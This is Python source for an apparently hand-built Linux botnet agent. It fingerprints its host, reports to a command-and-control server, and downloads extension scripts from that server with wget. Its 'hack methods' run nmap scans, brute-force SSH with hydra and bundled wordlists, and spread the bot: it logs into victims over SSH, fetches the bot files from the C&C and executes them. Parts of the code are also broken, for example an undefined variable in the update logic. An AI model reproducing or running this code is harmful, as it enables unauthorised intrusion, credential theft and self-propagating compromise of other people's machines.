import random
import os
import requests #need find the std_lib way
import paramiko
import config
import json
#TODO:
#1. Code update system
#2. Access to shell methods (reverse-shell, shell_exec )

class Bot:
    """This BotNet agent run only on Linux"""
    '''There are bot captions'''
    id_num = int()
    name = str()
    uname = str()
    root_status = bool
    network_config = {}
    comand_center = str()

    extention_scripts = {}

    '''Methods need to init'''
    def getUname(self):
        self.uname = os.popen('uname -a').read()


    def checkRootStatus(self):
        if 'root' in os.popen('whoami').read():
           self.root_status = True
        else:
            self.root_status = False


    def getNetworkConfig(self):
        network_config = {}
        ifconfig = os.popen('ifconfig').read().split('\n')[1].split(' ')
        network_config.update({'ip_addr':ifconfig[-5][ifconfig[-5].find(':')+1:]})
        network_config.update({'mask':ifconfig[-1][ifconfig[-1].find(':')+1:]})
        self.network_config = network_config


    def extension_preparing(self):
        extention_scripts = {"version":0, "scripts":[]}
        f = open('local_source_list.txt','r')
        local_source_list = f.read()
        f.close()
        local_source_list = local_source_list.split('\n')

        repository = requests.get(self.comand_center + "/Bot/repository/source_list.txt")
        repository = repository.text.split('\n')

        if(repository[0].split(":")[-1] == source_list[0].split(":")[-1]):
            extention_scripts["version"] = source_list[0].split(":")[-1]
            print("No updates on the command center")

            source_list = "".join(source_list[1:])
            source_list = source_list.split(";")
            for i in source_list:
                extention_scripts["scripts"].append(i)
                print("Init access to " + i)

        else:
            print("System updating, wait some time....")
            extention_scripts["version"] = repository[0].split(";")[-1]

            repository = "".join(repository[1:])
            repository.split(';')
            for i in repository:
                os.system("wget " + self.comand_center + "/Bot/repository/" + i )
                extention_scripts["scripts"].append(i)

            repository = requests.get(self.comand_center + "/Bot/repository/source_list.txt")
            f = open("local_source_list.txt", 'w')
            f.write(repository.text)
            f.close()

            self.extention_scripts = extention_scripts



    def __init__(self):
        self.id_num = random.randint(10000, 99999)
        self.name = (str(self.id_num)+"Bot")
        self.getUname()
        self.checkRootStatus()
        self.getNetworkConfig()
        self.comand_center = config.command_center_ip#How i can config this arg?
        self.extension_preparing()
        print("Starting " + self.name)


    '''Communications wih C&C methosds'''
    def request_update(self):
        update = requests.get(self.comand_center + '/load.php')
        update = update.json()
        return update[0]

    def is_it_for_me(self, sender_name, text):
        if(sender_name == 'master' and ( (text.find(self.name) != -1) or (text.find('all_bots') != -1))):
            return True
        else:
            return False

    def send_message(self, name, message):
        data = {
            'name' : self.name,
            'comment' : message
        }

        requests.post(self.comand_center + '/publish.php', data=data)

    def start_message(self): #How to make XML output?
        content = "New bot has been init: "
        content += "id: " + str(self.id_num) + " "
        content += "name: " + self.name + " "
        content += "Kernel: " + self.uname + " "
        content += "root_status: " + str(self.root_status) + " "
        content += "network_config: " + self.network_config.get('ip_addr') + " "
        content += self.network_config.get('mask') + " "
        content += "repository version: " + str(self.extention_scripts["version"])

        self.send_message(self.name, content)

    '''Hack methods. Main functional at here'''
    def nmap(self, target):
        print("Command " + target)
        nmap_output = os.popen('nmap ' + str(target)).read()
        self.send_message(self.name, nmap_output)
        print("Command OK return to main")

    def hydra_ssh(self, target):
        print("Command " + target)
        target = target.split(' ')[-1]
        os.system("hydra -L users.txt -P passwords.txt -t 4 " + str(target) + " ssh -o result.txt; cat result.txt")
        hydra_output = os.popen("cat result.txt").read().split('\n')[1:]
        hydra_output = "".join(hydra_output)
        self.send_message(self.name, hydra_output)
        os.system("rm -f result.txt")
        print("Command OK return to main")

    def bot_clone(self, target):
        print("Command " + target)
        target = target.split(' ')
        remote_ip = str(target[-3])
        username = str(target[-2])
        password = str(target[-1])
        print(remote_ip, username, password)

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=remote_ip, username=username, password=password)

        client.exec_command("wget " + self.comand_center +"/Bot/main.py;")
        client.exec_command("wget " + self.comand_center +"/Bot/Bot.py;")
        client.exec_command("wget " + self.comand_center +"/Bot/config.py;")
        client.exec_command("wget " + self.comand_center +"/Bot/users.txt;")
        client.exec_command("wget " + self.comand_center +"/Bot/passwords.txt;")
        client.exec_command("python3 main.py;")#Add a crontab

        self.send_message(self.name, "Bot has been cloned to " + str(remote_ip))
        client.close()
        print("Command OK return to main")
